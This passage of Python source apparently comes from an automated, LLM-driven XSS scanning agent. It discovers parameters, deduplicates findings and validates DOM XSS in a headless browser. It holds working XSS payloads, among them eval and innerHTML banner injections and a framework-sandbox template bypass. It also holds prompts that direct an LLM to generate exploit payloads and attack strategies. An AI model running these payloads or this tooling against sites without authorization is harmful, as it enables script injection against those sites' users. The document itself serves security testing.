                urls_to_test.extend(self._discovered_internal_urls)

            # SPRINT-2 (2026-02-12): Expand to recon URLs from GoSpider
            # Only add URLs with query params (they have injectable surfaces)
            recon_urls = self._load_recon_urls_with_params()
            if recon_urls:
                existing = set(urls_to_test)
                added = 0
                for rurl in recon_urls:
                    if rurl not in existing:
                        urls_to_test.append(rurl)
                        existing.add(rurl)
                        added += 1
                if added:
                    logger.info(f"[{self.name}] 🔍 Added {added} recon URLs for DOM XSS testing")
            if hasattr(self, '_v'):
                self._v.emit("exploit.xss.dom.started", {"url": self.url, "urls_count": len(urls_to_test)})
            logger.info(f"[{self.name}] DOM XSS scanning {len(urls_to_test)} URLs")

            # Gap 3 Fix: Pass discovered param names so DOM XSS tests each param individually
            # (e.g., ?back=CANARY, ?searchTerm=CANARY) instead of only ?xss=CANARY
            discovered_param_names = None
            if hasattr(self, '_discovered_params') and self._discovered_params:
                discovered_param_names = list(self._discovered_params.keys())
            elif hasattr(self, '_last_all_params') and self._last_all_params:
                discovered_param_names = list(self._last_all_params.keys())

            # Single browser for ALL urls. Previously each url called detect_dom_xss(),
            # which launches+closes Chromium every time — a ~1-2s cold start per url that
            # dominated slow scans (browser restarted for each of N urls). The batch keeps
            # one browser open; a per-url timeout still skips a hanging url without tearing
            # the shared browser down.
            dom_findings = []
            try:
                dom_findings = await detect_dom_xss_batch(
                    urls_to_test,
                    discovered_params=discovered_param_names,
                    per_url_timeout=180,
                )
            except Exception as e:
                logger.debug(f"[{self.name}] DOM XSS batch scan failed: {e}")

            if not dom_findings:
                dashboard.log(f"[{self.name}] No DOM XSS candidates found across {len(urls_to_test)} URLs", "INFO")
                return

            dashboard.log(
                f"[{self.name}] 🔍 Found {len(dom_findings)} DOM XSS candidates from {len(urls_to_test)} URLs, validating visually...",
                "INFO"
            )

            confirmed_count = 0
            skipped_count = 0

            for df in dom_findings:
                sink = df.get("sink", "")
                source_str = df.get("source", "unknown")
                payload = df.get("payload", "")
                param_name = source_str.split(":")[-1] if ":" in source_str else source_str

                # --- FP filtering: reject findings that don't prove execution ---

                # 1. Canary-only payloads: a plain string reaching innerHTML is NOT XSS.
                #    Real XSS requires HTML/JS execution (e.g., <script>, onerror=, javascript:)
                canary_base = "BUGTRACEAI_7x7"
                payload_stripped = payload.replace(canary_base, "").replace("|", "").replace(param_name, "").strip()
                is_canary_only = not payload_stripped or payload_stripped in ("", "|")
                if is_canary_only and sink != "alert":
                    skipped_count += 1
                    logger.info(f"[{self.name}] DOM XSS FP filtered: canary-only payload in {sink} sink (param: {param_name})")
                    continue

                # 2. postMessage self-send: scanner sends its own message, doesn't prove
                #    cross-origin exploitability. Reject unless alert() actually fired.
                if source_str == "window.postMessage" and sink != "alert":
                    skipped_count += 1
                    logger.info(f"[{self.name}] DOM XSS FP filtered: postMessage self-send to {sink} sink")
                    continue

                # 3. Static analysis patterns: regex source→sink matching without execution proof.
                if "source-to-sink pattern detected" in payload.lower() or "static analysis" in str(df.get("evidence", "")).lower():
                    skipped_count += 1
                    logger.info(f"[{self.name}] DOM XSS FP filtered: static analysis pattern, no execution proof")
                    continue

                # --- Passed FP filters: this is a real DOM XSS finding ---
                confirmed_count += 1
                self.findings.append(XSSFinding(
                    url=df["url"],
                    parameter=param_name,
                    payload=payload,
                    context="dom_xss",
                    validation_method="dom_xss_hook_confirmed",
                    evidence={
                        "sink": sink,
                        "source": source_str,
                        "hook_confirmed": True,
                        "validation_note": f"Payload reached {sink} sink — confirmed by Playwright runtime hook"
                    },
                    confidence=0.95,
                    status="VALIDATED_CONFIRMED",
                    validated=True,
                    reflection_context=source_str,
                    successful_payloads=[payload]
                ))
                dashboard.log(
                    f"[{self.name}] ✅ DOM XSS CONFIRMED via hook: {sink} (param: {param_name})",
                    "SUCCESS"
                )

            if skipped_count > 0:
                dashboard.log(
                    f"[{self.name}] 🛡️ DOM XSS: filtered {skipped_count}/{len(dom_findings)} false positives (canary-only/self-send/static)",
                    "INFO"
                )

            if hasattr(self, '_v'):
                self._v.emit("exploit.xss.dom.result", {"url": self.url, "candidates": len(dom_findings), "confirmed": confirmed_count})

            if confirmed_count > 0:
                dashboard.log(
                    f"[{self.name}] 🎯 DOM XSS: {confirmed_count}/{len(dom_findings)} confirmed!",
                    "SUCCESS"
                )
            else:
                dashboard.log(
                    f"[{self.name}] ⚠️ DOM XSS: {len(dom_findings)} candidates, 0 confirmed",
                    "WARN"
                )

        except Exception as e:
            logger.error(f"[{self.name}] DOM XSS Headless Scan failed: {e}", exc_info=True)
            dashboard.log(f"[{self.name}] ⚠️ DOM XSS Scan skipped: Headless error", "WARN")

    async def _validate_dom_xss_visually(
        self,
        url: str,
        payload: str,
        sink: str,
        source: str,
        screenshots_dir: Path = None
    ) -> Optional[Dict[str, Any]]:
        """
        Validate DOM XSS candidate with screenshot + Vision AI.

        This is the BULLETPROOF validation:
        1. Navigate to URL (payload already in URL from detector)
        2. Capture screenshot
        3. Vision AI confirms: "Do you see alert/XSS execution?"

        Returns:
            Evidence dict with vision_confirmed=True if validated, None otherwise
        """
        try:
            # Use verifier with screenshot capture
            screenshot_path = None
            if screenshots_dir:
                screenshots_dir = Path(screenshots_dir)
                screenshots_dir.mkdir(parents=True, exist_ok=True)

            result = await self.verifier.verify_xss(
                url=url,
                screenshot_dir=str(screenshots_dir) if screenshots_dir else None,
                timeout=10.0,
                max_level=3
            )

            evidence = {
                "sink": sink,
                "source": source,
                "detector_found": True,
                "playwright_tested": True
            }

            if result and result.screenshot_path:
                evidence["screenshot_path"] = result.screenshot_path

                # Vision AI validation
                await self._run_vision_validation(
                    screenshot_path=result.screenshot_path,
                    attack_url=url,
                    payload=payload,
                    evidence=evidence
                )

            if result and result.success:
                evidence["playwright_confirmed"] = True
                # If Playwright confirmed but no Vision, still consider it
                # but with lower confidence
                if not evidence.get("vision_confirmed"):
                    evidence["validation_note"] = "Playwright confirmed, Vision not available"

            return evidence if (evidence.get("vision_confirmed") or evidence.get("playwright_confirmed")) else None

        except Exception as e:
            logger.error(f"[{self.name}] DOM XSS visual validation failed: {e}")
            return None

    async def _try_alternative_dom_payloads(
        self,
        url: str,
        sink: str,
        source: str,
        original_payload: str,
        screenshots_dir: Path = None
    ) -> Optional[Dict[str, Any]]:
        """
        Generate and test alternative payloads when original doesn't work visually.

        Uses DeepSeek to generate 10 visual payloads for the specific sink/source
        combination, then tests each until one is visually confirmed.

        Args:
            url: Base URL (without payload)
            sink: DOM sink (e.g., "eval", "innerHTML")
            source: DOM source (e.g., "postMessage", "location.hash")
            original_payload: The payload that didn't work
            screenshots_dir: Directory for screenshots

        Returns:
            Evidence dict with working_payload if found, None otherwise
        """
        from bugtrace.core.llm_client import llm_client
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        dashboard.log(
            f"[{self.name}] 🎨 Generating alternative payloads for {sink}...",
            "INFO"
        )

        # Generate visual payloads via DeepSeek
        prompt = f"""You are a DOM XSS expert. I found a DOM XSS vulnerability:
- Sink: {sink}
- Source: {source}
- Original payload that was detected but not visually confirmed: {original_payload[:100]}

Generate exactly 10 XSS payloads that will:
1. Exploit this specific sink ({sink}) via the source ({source})
2. Create a VISIBLE RED BANNER with text "HACKED BY BUGTRACEAI"

CRITICAL: Use BACKTICKS (`) instead of quotes for all strings to avoid escaping issues!

Working example for eval sink (uses backticks):
var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);

Working example for innerHTML sink:
<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999">HACKED BY BUGTRACEAI</div>

Adapt the payload to work with the {sink} sink:
- For eval/Function: use backticks for strings, create div via DOM API
- For innerHTML/outerHTML: inject div HTML directly
- For document.write: write the full div HTML
- For postMessage: craft message payload with backticks

Return ONLY the payloads, one per line, no explanations."""

        try:
            response = await llm_client.generate(
                prompt=prompt,
                module_name="DOM-XSS-AltPayloads",
                model_override=settings.MUTATION_MODEL,
                temperature=0.7,
                max_tokens=2000
            )

            if not response:
                return {"attempts": 0, "error": "LLM returned empty response"}

            # Parse payloads
            payloads = []
            for line in response.strip().split("\n"):
                line = line.strip()
                if line and not line.startswith("#") and len(line) > 5:
                    # Remove numbering
                    if len(line) > 2 and line[0].isdigit() and line[1] in ".):":
                        line = line[2:].strip()
                    payloads.append(line)

            payloads = payloads[:10]  # Max 10

            if not payloads:
                return {"attempts": 0, "error": "No payloads generated"}

            dashboard.log(
                f"[{self.name}] Testing {len(payloads)} alternative payloads...",
                "INFO"
            )

            # Test each payload
            for i, payload in enumerate(payloads):
                dashboard.set_current_payload(
                    f"ALT [{i+1}/{len(payloads)}]",
                    "DOM XSS Alt",
                    "Testing"
                )

                # Build URL with payload
                # For DOM XSS, payload often goes in hash or specific param
                parsed = urlparse(url)
                if source == "location.hash":
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}#{payload}"
                elif source == "postMessage":
                    # postMessage needs different approach - use original URL
                    # and inject via script
                    test_url = url
                else:
                    # Try in query string — use param name from source if available
                    params = parse_qs(parsed.query)
                    # Extract param name from source (e.g., "param:returnPath" → "returnPath")
                    if source and ":" in source:
                        param_name = source.split(":")[-1]
                    elif source and source.startswith("location."):
                        param_name = list(params.keys())[0] if params else "input"
                    else:
                        param_name = list(params.keys())[0] if params else "input"
                    params[param_name] = [payload]
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, urlencode(params, doseq=True), parsed.fragment
                    ))

                # Validate visually
                evidence = await self._validate_dom_xss_visually(
                    url=test_url,
                    payload=payload,
                    sink=sink,
                    source=source,
                    screenshots_dir=screenshots_dir
                )

                if evidence and evidence.get("vision_confirmed"):
                    evidence["working_payload"] = payload
                    evidence["attempts"] = i + 1
                    evidence["total_alternatives"] = len(payloads)
                    return evidence

            # None worked
            return {"attempts": len(payloads), "error": "No payload visually confirmed"}

        except Exception as e:
            logger.error(f"[{self.name}] Alternative payload generation failed: {e}")
            return {"attempts": 0, "error": str(e)}

    async def _loop_test_additional_vectors(self, interactsh_domain: str, screenshots_dir: Path):
        """Phase 4: Additional attack vectors (POST, Headers)."""
        if self._max_impact_achieved:
            return

        # 4.1: Test POST forms
        dashboard.log(f"[{self.name}] 📝 Phase 4.1: Testing POST forms...", "INFO")
        try:
            post_findings = await self._discover_and_test_post_forms(
                interactsh_domain, screenshots_dir
            )
            for pf in post_findings:
                self.findings.append(pf)
                if self._max_impact_achieved:
                    break
            if post_findings:
                dashboard.log(f"[{self.name}] 🎯 POST XSS found: {len(post_findings)} hits!", "SUCCESS")
        except Exception as e:
            logger.debug(f"POST form testing failed: {e}")

    # =========================================================================
    # Queue Consumption Mode (Phase 19) - WET→DRY
    # =========================================================================

    async def analyze_and_dedup_queue(self) -> List[Dict]:
        import asyncio, time
        from bugtrace.core.queue import queue_manager
        logger.info(f"[{self.name}] ===== PHASE A: Analyzing WET list =====")
        queue = queue_manager.get_queue("xss")
        wet_findings = []
        wait_start = time.monotonic()
        while (time.monotonic() - wait_start) < 300.0:
            if queue.depth() if hasattr(queue, 'depth') else 0 > 0:
                break
            await asyncio.sleep(0.5)
        else:
            return []
        empty_count = 0
        while empty_count < 10:
            item = await queue.dequeue(timeout=0.5)
            if item is None:
                empty_count += 1
                await asyncio.sleep(0.5)
                continue
            empty_count = 0
            finding = item.get("finding", {})
            if finding.get("url") and finding.get("parameter"):
                wet_findings.append({"url": finding["url"], "parameter": finding["parameter"], "context": finding.get("context","html"), "finding": finding, "scan_context": item.get("scan_context", self._scan_context)})
        logger.info(f"[{self.name}] Phase A: Drained {len(wet_findings)} WET findings")
        if not wet_findings:
            return []

        # ARCHITECTURE: ALWAYS keep original WET params + ADD discovered params
        logger.info(f"[{self.name}] Phase A: Expanding WET findings with XSS-focused discovery...")
        expanded_wet_findings = []
        seen_urls = set()
        seen_params = set()

        # 1. Always include ALL original WET params first (DASTySAST signals)
        for wet_item in wet_findings:
            url = wet_item.get("url", "")
            param = wet_item.get("parameter", "") or (wet_item.get("finding", {}) or {}).get("parameter", "")
            if param and (url, param) not in seen_params:
                seen_params.add((url, param))
                # Propagate http_method from finding or default GET
                if "http_method" not in wet_item:
                    wet_item["http_method"] = (wet_item.get("finding", {}) or {}).get("http_method") or "GET"
                expanded_wet_findings.append(wet_item)

        # 2. Discover additional params per unique URL
        for wet_item in wet_findings:
            url = wet_item.get("url", "")
            if url in seen_urls:
                continue
            seen_urls.add(url)

            try:
                all_params = await self._discover_xss_params(url)
                # Gap 3 Fix: Store discovered params for DOM XSS parameter-aware testing
                self._last_all_params = all_params
                if not all_params:
                    continue

                new_count = 0
                param_meta = getattr(self, '_param_metadata', {})
                for param_name, param_value in all_params.items():
                    if (url, param_name) not in seen_params:
                        seen_params.add((url, param_name))
                        pm = param_meta.get(param_name, {})
                        expanded_wet_findings.append({
                            "url": url,
                            "parameter": param_name,
                            "context": wet_item.get("context", "html"),
                            "finding": wet_item.get("finding", {}),
                            "scan_context": wet_item.get("scan_context", self._scan_context),
                            "_discovered": True,
                            "http_method": getattr(self, '_param_methods', {}).get(param_name, "GET"),
                            "param_source": pm.get("source", "unknown"),
                            "form_enctype": pm.get("enctype", ""),
                            "form_action": pm.get("action_url", ""),
                        })
                        new_count += 1

                if new_count:
                    logger.info(f"[{self.name}] 🔍 Discovered {new_count} additional params on {url}")

            except Exception as e:
                logger.error(f"[{self.name}] Discovery failed for {url}: {e}")

        # 2.5 Resolve endpoint URLs from HTML links/forms + reasoning fallback
        from bugtrace.agents.specialist_utils import resolve_param_endpoints, resolve_param_from_reasoning
        if hasattr(self, '_last_discovery_html') and self._last_discovery_html:
            for base_url in seen_urls:
                endpoint_map = resolve_param_endpoints(self._last_discovery_html, base_url)
                # Fallback: extract endpoints from DASTySAST reasoning text
                reasoning_map = resolve_param_from_reasoning(expanded_wet_findings, base_url)
                for k, v in reasoning_map.items():
                    if k not in endpoint_map:
                        endpoint_map[k] = v
                if endpoint_map:
                    resolved_count = 0
                    for item in expanded_wet_findings:
                        if item.get("url") == base_url:
                            param = item.get("parameter", "")
                            if param in endpoint_map and endpoint_map[param] != base_url:
                                item["url"] = endpoint_map[param]
                                resolved_count += 1
                    if resolved_count:
                        logger.info(f"[{self.name}] 🔗 Resolved {resolved_count} params to actual endpoint URLs")

        logger.info(f"[{self.name}] Phase A: Expanded {len(wet_findings)} hints → {len(expanded_wet_findings)} testable params")

        # Now deduplicate the expanded list
        try:
            dry_list = await self._llm_analyze_and_dedup(expanded_wet_findings, self._scan_context)
        except Exception:
            # `except Exception`, NOT a bare `except`. _llm_analyze_and_dedup already handles
            # its own Exception and returns the fingerprint fallback, so a bare clause here
            # could only ever catch what Exception does not: CancelledError / KeyboardInterrupt.
            # Swallowing those meant the operator pressing Stop mid-dedup was ignored and the
            # full exploitation ladder then ran against a target they had asked us to leave alone.
            dry_list = self._fallback_fingerprint_dedup(expanded_wet_findings)
        self._dry_findings = dry_list
        logger.info(f"[{self.name}] Phase A: {len(expanded_wet_findings)} WET → {len(dry_list)} DRY ({len(expanded_wet_findings)-len(dry_list)} duplicates removed)")
        return dry_list

    async def _llm_analyze_and_dedup(self, wet_findings: List[Dict], context: str) -> List[Dict]:
        """
        Call LLM to analyze WET list and generate DRY list (v3.2: Context-Aware).

        Uses tech stack context for intelligent XSS-specific filtering.
        """
        from bugtrace.core.llm_client import llm_client
        import json

        # Extract tech stack info for prompt
        tech_stack = getattr(self, '_tech_stack_context', {}) or {}
        lang = tech_stack.get('lang', 'generic')
        server = tech_stack.get('server', 'generic')
        waf = tech_stack.get('waf')
        frameworks = tech_stack.get('frameworks', [])

        # Get XSS-specific context prompts
        xss_prime_directive = getattr(self, '_xss_prime_directive', '')
        xss_dedup_context = self.generate_xss_dedup_context(tech_stack) if tech_stack else ''

        # Build enhanced system prompt with tech context (v3.2)
        system_prompt = f"""You are an expert XSS security analyst with deep knowledge of web frameworks.

{xss_prime_directive}

{xss_dedup_context}

## TARGET CONTEXT
- Backend Language: {lang}
- Web Server: {server}
- WAF: {waf or 'None detected'}
- Frameworks: {', '.join(frameworks[:3]) if frameworks else 'Unknown'}

## WET LIST ({len(wet_findings)} potential XSS findings):
{json.dumps(wet_findings, indent=2)}

## TASK
1. Analyze each finding considering the injection context (HTML body, attribute, JS, etc.)
2. **CRITICAL - Framework Detection from Findings:**
   - ALWAYS check each item's nested "finding.reasoning" field for framework mentions
   - Look for: AngularJS, Angular, Vue, React, Ember, Svelte in the reasoning text
   - If reasoning mentions "AngularJS" or "Angular 1.x" → recommended_payload_type: "template"
   - If reasoning mentions "Vue" → recommended_payload_type: "template"
   - If reasoning mentions "React" → recommended_payload_type: "template"
   - Template payloads like {{constructor.constructor('alert(1)')()}} bypass framework sandboxes
   - Event handlers (onclick, onerror, onfocus) are BLOCKED by Angular/Vue/React CSP
   - THIS IS CRITICAL: Event handler payloads WILL FAIL on these frameworks
3. Apply context-aware deduplication:
   - **CRITICAL:** If items have "_discovered": true, they are DIFFERENT PARAMETERS discovered autonomously
   - Even if they share the same "finding" object, treat them as SEPARATE based on "parameter" field
   - Same URL + DIFFERENT param → DIFFERENT (keep all)
   - Same URL + param + DIFFERENT context type → DIFFERENT (keep both)
   - Different endpoints → DIFFERENT (keep both)
   - ONLY mark as DUPLICATE if: Same URL + Same param + Same context
4. Prioritize findings based on framework exploitability
5. Filter findings unlikely to succeed given the tech stack
6. **ATTACK STRATEGY REASONING**: For each finding, reason about the BEST way to attack it:
   - Consider the http_method (GET vs POST — POST params must be sent in form body, not URL)
   - Consider the param_source (form_input, url_query, anchor_href)
   - Consider form_enctype if present (multipart vs url-encoded)
   - Consider the reflection context and server escaping behavior from the reasoning
   - Example: "POST form param reflecting unescaped in HTML text. Use visual DOM payload via POST body."
   - Example: "GET param in JS single-quoted string. Server escapes backslash to double-backslash but NOT quotes. Backslash-quote breakout: \\' followed by JS payload."

## OUTPUT FORMAT (JSON only, no markdown):
{{
  "findings": [
    {{
      "url": "...",
      "parameter": "...",
      "context": "html_body|attribute|javascript|url|css",
      "http_method": "GET or POST (preserve from input, default GET)",
      "attack_strategy": "Brief reasoning about HOW to exploit this param considering method, context, escaping",
      "rationale": "why this is unique and exploitable",
      "attack_priority": 1-5,
      "recommended_payload_type": "svg|img|script|event_handler|template"
    }}
  ],
  "duplicates_removed": <count>,
  "reasoning": "Brief explanation of deduplication strategy"
}}"""

        try:
            response = await llm_client.generate(
                prompt="Analyze the WET list above and return deduplicated XSS findings in JSON format.",
                system_prompt=system_prompt,
                module_name="XSS_DEDUP",
                temperature=0.2
            )

            from bugtrace.utils.json_parser import extract_json_list, safe_json_loads

            dry_data = safe_json_loads(response)
            dry_list = extract_json_list(dry_data, "findings")
            if dry_list is None:
                logger.warning(f"[XSSAgent] LLM deduplication returned invalid JSON, using fingerprint fallback")
                dry_list = wet_findings

            # Post-LLM merge: ensure deterministic fields are preserved (LLM may drop them)
            wet_meta_map = {}
            for wf in wet_findings:
                key = (wf.get("url", ""), wf.get("parameter", ""))
                wet_meta_map[key] = {
                    "http_method": wf.get("http_method", "GET"),
                    "param_source": wf.get("param_source", ""),
                    "form_enctype": wf.get("form_enctype", ""),
                    "form_action": wf.get("form_action", ""),
                    "context": canonical_probe_context(wf.get("probe_context", "")),
                }
            for df in dry_list:
                key = (df.get("url", ""), df.get("parameter", ""))
                wet_meta = wet_meta_map.get(key, {})
                if not df.get("http_method"):
                    df["http_method"] = wet_meta.get("http_method", "GET")
                if not df.get("param_source"):
                    df["param_source"] = wet_meta.get("param_source", "")
                if not df.get("form_enctype"):
                    df["form_enctype"] = wet_meta.get("form_enctype", "")
                if not df.get("form_action"):
                    df["form_action"] = wet_meta.get("form_action", "")
                # A MEASUREMENT overwrites the model's answer, it does not merely fill a
                # blank. The dedup prompt asks the LLM for `context` and it has replied
                # "html" on every record ever written, so a fill-if-empty rule would never
                # fire once. Only a real probe label wins; "" leaves the LLM's value alone.
                measured_context = wet_meta.get("context", "")
                if measured_context and df.get("context") != measured_context:
                    logger.debug(
                        f"[{self.name}] dry context for '{df.get('parameter')}': "
                        f"{df.get('context')!r} (LLM) -> {measured_context!r} (probe)"
                    )
                    df["context"] = measured_context

            logger.info(f"[{self.name}] LLM deduplication: {dry_data.get('reasoning', 'No reasoning provided')}")
            return dry_list

        except Exception as e:
            logger.error(f"[{self.name}] LLM deduplication failed: {e}. Falling back to fingerprint dedup.")
            return self._fallback_fingerprint_dedup(wet_findings)

    def _fallback_fingerprint_dedup(self, wet_findings: List[Dict]) -> List[Dict]:
        seen, dry_list = set(), []
        for f in wet_findings:
            _ev = f.get("evidence") or {}
            fp = self._generate_xss_fingerprint(
                f.get("url",""), f.get("parameter",""), f.get("context","html"),
                sink=_ev.get("sink"), source=_ev.get("source")
            )
            if fp not in seen:
                seen.add(fp)
                dry_list.append(f)
        return dry_list

    def _load_recon_urls_with_params(self, max_urls: int = 15) -> List[str]:
        """
        Load recon URLs that have query parameters from GoSpider output.

        SPRINT-2 (2026-02-12): XSS Agent only tested the assigned URL.
        This expands testing to recon URLs discovered during reconnaissance.

        Only includes URLs with ?param=value (they have injectable surfaces).
        Capped to avoid excessive testing.
        """
        if not hasattr(self, 'report_dir') or not self.report_dir:
            return []

        urls_file = Path(self.report_dir) / "recon" / "urls.txt"
        if not urls_file.exists():
            return []

        try:
            from urllib.parse import urlparse, parse_qs
            base_domain = urlparse(self.url).netloc
            recon_urls = []
            seen_surfaces = set()

            for line in urls_file.read_text(encoding="utf-8").splitlines():
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parsed = urlparse(line)
                # Only same-domain URLs with query params
                if parsed.netloc == base_domain and parsed.query:
                    # Dedup by endpoint SURFACE (path + param names) before the cap. Otherwise a
                    # few near-duplicate URLs (catalog?category=Books, =Juice, =Gin, ...) fill the
                    # cap and crowd out distinct sink surfaces like /blog/post?postId= (where
                    # ?back=javascript:... is a DOM location sink). One URL per surface suffices —
                    # the specialists fuzz param VALUES themselves.
                    surface = (parsed.path, tuple(sorted(parse_qs(parsed.query).keys())))
                    if surface in seen_surfaces:
                        continue
                    seen_surfaces.add(surface)
                    recon_urls.append(line)
                    if len(recon_urls) >= max_urls:
                        break

            if recon_urls:
                logger.info(f"[{self.name}] Loaded {len(recon_urls)} recon URLs with params")
            return recon_urls

        except Exception as e:
            logger.warning(f"[{self.name}] Failed to load recon URLs: {e}")
            return []

    async def _discover_xss_params(self, url: str) -> Dict[str, str]:
        """
        XSS-focused parameter discovery for a given URL.

        Extracts ALL testable parameters from:
        1. URL query string
        2. HTML forms (input, textarea, select)
        3. JavaScript variables (var x = "USER_INPUT")

        Returns:
            Dict mapping param names to default values
            Example: {"category": "Juice", "searchTerm": "", "filter": ""}

        Architecture Note:
            Specialists must be AUTONOMOUS - they discover their own attack surface.
            The finding from DASTySAST is just a "signal" that the URL is interesting.
            We IGNORE the specific parameter and test ALL discoverable params.
        """
        from bugtrace.tools.visual.browser import browser_manager
        from bugtrace.agents.specialist_utils import extract_param_metadata
        from urllib.parse import urlparse, parse_qs, urljoin
        from bs4 import BeautifulSoup
        import re

        all_params = {}
        self._param_methods = {}  # Track HTTP method per param (GET/POST)
        self._param_metadata = {}  # Full metadata from centralized extraction

        # 1-3. Centralized extraction: URL query + HTML forms + anchor hrefs
        try:
            state = await browser_manager.capture_state(url)
            html = state.get("html", "")
        except Exception as e:
            logger.warning(f"[{self.name}] Failed to fetch HTML: {e}")
            html = ""

        # Extract URL params even without HTML
        try:
            parsed = urlparse(url)
            url_params = parse_qs(parsed.query)
            for param_name, values in url_params.items():
                all_params[param_name] = values[0] if values else ""
                self._param_methods[param_name] = "GET"
        except Exception as e:
            logger.warning(f"[{self.name}] Failed to parse URL params: {e}")

        if html:
            self._last_discovery_html = html  # Cache for URL resolution

            # Centralized metadata extraction (deterministic ground truth)
            self._param_metadata = extract_param_metadata(html, url)
            for param_name, meta in self._param_metadata.items():
                if param_name not in all_params:
                    all_params[param_name] = meta.get("default_value", "")
                self._param_methods[param_name] = meta["method"]

            # 4. XSS-specific: Extract JavaScript variables (not in shared util)
            try:
                js_var_pattern = r'var\s+(\w+)\s*=\s*["\']([^"\']*)["\']'
                for match in re.finditer(js_var_pattern, html):
                    var_name, var_value = match.groups()
                    if var_name not in all_params and len(var_name) > 2:
                        all_params[var_name] = var_value
            except Exception:
                pass

            # 5. XSS-specific: Extract internal links for DOM XSS coverage
            try:
                soup = BeautifulSoup(html, "html.parser")
                base_domain = urlparse(url).netloc
                internal_urls = set()
                for a_tag in soup.find_all("a", href=True):
                    href = a_tag["href"]
                    if href.startswith(("javascript:", "mailto:", "#", "tel:")):
                        continue
                    link = urljoin(url, href)
                    parsed_link = urlparse(link)
                    if parsed_link.netloc == base_domain and parsed_link.scheme in ("http", "https"):
                        clean_link = f"{parsed_link.scheme}://{parsed_link.netloc}{parsed_link.path}"
                        if clean_link != url.split("?")[0]:
                            internal_urls.add(clean_link)
                self._discovered_internal_urls = list(internal_urls)[:3]
                if self._discovered_internal_urls:
                    logger.info(f"[{self.name}] Discovered {len(self._discovered_internal_urls)} internal URLs for DOM XSS")
            except Exception:
                pass

        # Log detected methods
        post_params = [p for p, m in self._param_methods.items() if m == "POST"]
        if post_params:
            logger.info(f"[{self.name}] 📮 POST params detected: {post_params}")

        logger.info(f"[{self.name}] 🔍 Discovered {len(all_params)} params on {url}: {list(all_params.keys())}")
        return all_params

    async def exploit_dry_list(self) -> List[Dict]:
        logger.info(f"[{self.name}] ===== PHASE B: Exploiting {len(self._dry_findings)} DRY findings =====")

        # Setup Interactsh
        if not self.interactsh:
            try:
                self.interactsh = InteractshClient()
                await self.interactsh.register()
            except Exception as e:
                logger.warning(f"[{self.name}] Interactsh init failed: {e}")

        interactsh_url = ""
        if self.interactsh:
            try:
                interactsh_url = self.interactsh.get_url() if hasattr(self.interactsh, 'get_url') else ""
            except Exception:
                pass

        # Screenshots dir
        screenshots_dir = self.report_dir / "captures"
        screenshots_dir.mkdir(parents=True, exist_ok=True)

        _scan_root_url = self.url  # loop reassigns self.url per-finding; restore for Phase B.2/B.3
        # Worker/queue mode: this agent is created with url="" (team.py) and self.url is never
        # set to the target — so _scan_root_url would be "" and Phase B.2 DOM XSS would scan an
        # empty URL, never testing the real frontend (e.g. https://host/ where
        # ?search=<img onerror> -> dangerouslySetInnerHTML). Derive the scan-root origin from the
        # DRY candidates. (Fixes 3.6.1-beta regression: the restore-to-self.url assumed self.url
        # held the scan root, which is only true for the non-queue run_loop path.)
        if not _scan_root_url and self._dry_findings:
            _p = urllib.parse.urlparse(self._dry_findings[0].get("url", ""))
            if _p.scheme and _p.netloc:
                _scan_root_url = f"{_p.scheme}://{_p.netloc}/"
        validated = []
        for idx, f in enumerate(self._dry_findings, 1):
            try:
                self.url = f["url"]
                param_name = f["parameter"]

                # Read reflection context and HTTP method from DRY finding
                finding_context = f.get("context", "html")
                probe_snippet = f.get("_probe_snippet", "")
                http_method = f.get("http_method", "GET")

                # Log LLM attack strategy if available
                attack_strategy = f.get("attack_strategy", "")
                if attack_strategy:
                    logger.info(f"[{self.name}] LLM strategy for '{param_name}': {attack_strategy}")

                logger.info(f"[{self.name}] [{idx}/{len(self._dry_findings)}] Testing '{param_name}' on {self.url} (method: {http_method}, context: {finding_context})")
                if hasattr(self, '_v'):
                    self._v.emit("exploit.xss.param.started", {"param": param_name, "url": self.url, "index": idx, "total": len(self._dry_findings), "context": finding_context, "method": http_method})
                    self._v.reset("exploit.xss.level.progress")

                # v3.4: 6-Level Escalation Pipeline
                result = await self._xss_escalation_pipeline(
                    self.url, param_name, interactsh_url, screenshots_dir,
                    context=finding_context, probe_snippet=probe_snippet,
                    http_method=http_method
                )

                if result and result.validated:
                    validated.append(result)
                    fp = self._generate_xss_fingerprint(self.url, param_name, result.context or "html")
                    if fp not in self._emitted_findings:
                        self._emitted_findings.add(fp)
                        needs_cdp = (result.status == "NEEDS_CDP_VALIDATION")
                        finding_dict = {
                            "type": "XSS",
                            "url": result.url,
                            "parameter": result.parameter,
                            "payload": result.payload,
                            "context": result.context,
                            "evidence": {"validated": True, "level": result.evidence.get("level", "unknown")}
                        }
                        emitted = self._emit_xss_finding(
                            finding_dict,
                            status=result.status or ValidationStatus.VALIDATED_CONFIRMED.value,
                            needs_cdp=needs_cdp
                        )
                        if emitted:
                            logger.info(f"[{self.name}] ✅ Emitted XSS: {self.url}?{param_name} (level: {result.evidence.get('level', '?')}, context: {result.context or 'html'})")
                        else:
                            logger.warning(f"[{self.name}] ⚠️  XSS NOT emitted (rejected by _validate_before_emit): {self.url}?{param_name} (level: {result.evidence.get('level', '?')}) — finding still reaches the report via the specialist results file, but never the event bus")
                        if hasattr(self, '_v'):
                            self._v.emit("exploit.xss.confirmed", {"param": param_name, "url": self.url, "level": result.evidence.get("level", "unknown"), "context": result.context or "html", "payload": result.payload[:80]})
                if hasattr(self, '_v'):
                    self._v.emit("exploit.xss.param.completed", {"param": param_name, "url": self.url, "confirmed": bool(result and result.validated)})
            except Exception as e:
                logger.error(f"[{self.name}] Phase B [{idx}/{len(self._dry_findings)}]: {e}")
        logger.info(f"[{self.name}] Phase B complete: {len(validated)} validated")
        self.url = _scan_root_url  # restore: loop above mutated self.url to the last DRY finding

        # NEGATIVE EVIDENCE: written here, before Phase B.2/B.3, so a later phase raising
        # cannot take the record of what Phase B actually did down with it.
        self._write_xss_coverage()

        # Phase B.2: DOM XSS testing (Playwright) - tests self.url + discovered internal URLs
        try:
            screenshots_dir = None
            if hasattr(self, 'report_dir') and self.report_dir:
